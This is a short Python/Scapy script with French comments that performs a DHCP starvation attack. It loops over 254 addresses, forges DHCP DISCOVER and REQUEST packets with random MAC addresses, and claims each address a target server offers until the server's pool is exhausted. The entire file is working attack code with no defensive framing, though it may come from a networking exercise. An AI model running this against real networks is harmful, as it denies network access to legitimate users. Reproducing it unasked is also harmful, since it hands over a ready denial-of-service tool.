from scapy.all import *
import sys

# on recupere l'adresse du reseau (/24)
reseau_base = sys.argv[2].rsplit(".", 1)[0]

# on demande les 254 ip du reseau
for i in range(1, 255):

    mac_aleatoire  = RandMAC()
    transaction_id = RandInt()

    # discover
    paquet   = IP(src="0.0.0.0", dst="255.255.255.255") # j'ai mis en broadcast car en unicast ca marchait pas :(
    udp      = UDP(sport=68, dport=67)
    bootp    = BOOTP(chaddr=mac_aleatoire, xid=transaction_id)
    dhcp     = DHCP(options=[("message-type","discover"), "end"])

    send(paquet/udp/bootp/dhcp, verbose=0)

    # attend l'offer
    offer = sniff(filter="udp and port 68", count=1, timeout=2)

    # request
    ip_proposee = offer[0][BOOTP].yiaddr
    bootp2 = BOOTP(chaddr=mac_aleatoire, xid=transaction_id)
    dhcp2  = DHCP(options=[("message-type","request"), ("server_id", sys.argv[1]), ("requested_addr", ip_proposee), "end"])

    send(paquet/udp/bootp2/dhcp2, verbose=0)

print("starvation terminée !")